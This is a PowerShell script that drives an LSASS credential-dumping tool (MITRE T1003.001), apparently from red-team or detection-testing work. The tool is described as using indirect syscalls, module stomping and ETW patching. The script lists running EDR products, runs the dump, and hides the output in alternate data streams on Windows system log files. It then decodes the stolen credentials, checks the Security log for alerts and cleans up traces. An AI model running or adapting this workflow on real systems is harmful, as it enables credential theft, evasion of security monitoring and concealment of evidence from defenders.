# run_test.ps1 — Plan 1: LSASS Memory Dump Automated Test
param(
    [switch]$SkipCleanup,
    [switch]$DumpOnly,
    [string]$OutputDir = ".\output"
)

$TOOL = "..\LSASSDump.exe"
$LOG  = Join-Path $OutputDir "test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
}

function Log($message) {
    $timestamp = Get-Date -Format 'HH:mm:ss.fff'
    "$timestamp  $message" | Tee-Object $LOG -Append
}

# ─── Banner ───
Log "=" * 70
Log "  Plan 1: LSASS Memory Dump — Automated Test"
Log "  Target: T1003.001"
Log "  Method: Indirect Syscall + Module Stomping + ETW Patching"
Log "=" * 70
Log ""

# ─── Environment Check ───
Log ">>> ENVIRONMENT CHECK <<<"
Log ""

# OS Version
$os = Get-WmiObject Win32_OperatingSystem
Log "OS:         $($os.Caption) ($($os.Version))"
Log "Build:      $($os.BuildNumber)"
Log "Arch:       $($os.OSArchitecture)"

# Privilege check
Log ""
Log ">>> PRIVILEGE CHECK <<<"
Log ""

$whoami = & $TOOL --whoami 2>&1
foreach ($line in $whoami) { Log $line }

# Check if SYSTEM
$isSystem = $false
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
if ($currentUser.IsSystem) {
    $isSystem = $true
    Log "Running as SYSTEM: YES"
} else {
    Log "Running as SYSTEM: NO (may fail if not elevated)"
}

# Check EDR presence
Log ""
Log ">>> EDR CHECK <<<"
Log ""

$edrProcesses = @("MsMpEng", "SenseCncProxy", "SenseIR", "CSFalconService",
    "CbDefense", "SentinelAgent", "xagt", "Cybereason", "TaniumClient")
foreach ($proc in $edrProcesses) {
    $found = Get-Process -Name $proc -ErrorAction SilentlyContinue
    if ($found) { Log "EDR Process: $proc (PID: $($found.Id))" }
}
Log ""

# ─── Run Dump ───
Log ">>> DUMP EXECUTION <<<"
Log ""

$sw = [Diagnostics.Stopwatch]::StartNew()

if ($DumpOnly) {
    Log "Running: --dump-only"
    $result = & $TOOL --dump-only 2>&1
} else {
    Log "Running: --dump-full"
    $result = & $TOOL --dump-full 2>&1
}

$sw.Stop()
$exitCode = $LASTEXITCODE

foreach ($line in $result) { Log $line }

Log ""
Log "Exit Code: $exitCode"
Log "Duration:  $($sw.Elapsed.TotalSeconds.ToString('F2'))s"

# ─── Verify Output ───
Log ""
Log ">>> OUTPUT VERIFICATION <<<"
Log ""

$adsTargets = @(
    "C:\Windows\System32\config\software.log:lsass",
    "C:\Windows\System32\winevt\Logs\Application.evtx:lsass",
    "C:\Windows\System32\LogFiles\HTTPERR\httperr1.log:lsass"
)

$adsFound = $false
foreach ($ads in $adsTargets) {
    $content = Get-Content $ads -Raw -ErrorAction SilentlyContinue
    if ($content) {
        Log "ADS found: $ads ($($content.Length) chars)"
        $adsFound = $true

        # Try to verify with Python
        $verifyScript = Join-Path $PSScriptRoot "verify_creds.py"
        if (Test-Path $verifyScript) {
            $outputFile = Join-Path $OutputDir "creds_decoded.txt"
            python3 $verifyScript --input-text "$content" --output $outputFile 2>&1 | ForEach-Object { Log $_ }
        }
        break
    }
}

if (-not $adsFound) {
    Log "WARNING: No ADS output found at expected paths"
}

# ─── EDR Alert Check ───
Log ""
Log ">>> EDR ALERT CHECK <<<"
Log ""

$checkScript = Join-Path $PSScriptRoot "detect_check.ps1"
if (Test-Path $checkScript) {
    & $checkScript | ForEach-Object { Log $_ }
} else {
    # Simple check: look for recent security events
    $recentEvents = Get-WinEvent -LogName Security -MaxEvents 50 -ErrorAction SilentlyContinue |
        Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) } |
        Where-Object { $_.Id -in @(4663, 4656, 4688, 5156) }
    if ($recentEvents) {
        Log "Recent security events: $($recentEvents.Count)"
        $recentEvents | Format-Table Id, TimeCreated, Message -AutoSize |
            Out-String | ForEach-Object { Log $_ }
    } else {
        Log "No suspicious recent security events"
    }
}

# ─── Cleanup ───
if (-not $SkipCleanup) {
    Log ""
    Log ">>> CLEANUP <<<"
    Log ""

    $cleanupResult = & $TOOL --cleanup 2>&1
    foreach ($line in $cleanupResult) { Log $line }
}

Log ""
Log "=" * 70
Log "  TEST COMPLETE"
Log "  Log: $LOG"
Log "=" * 70
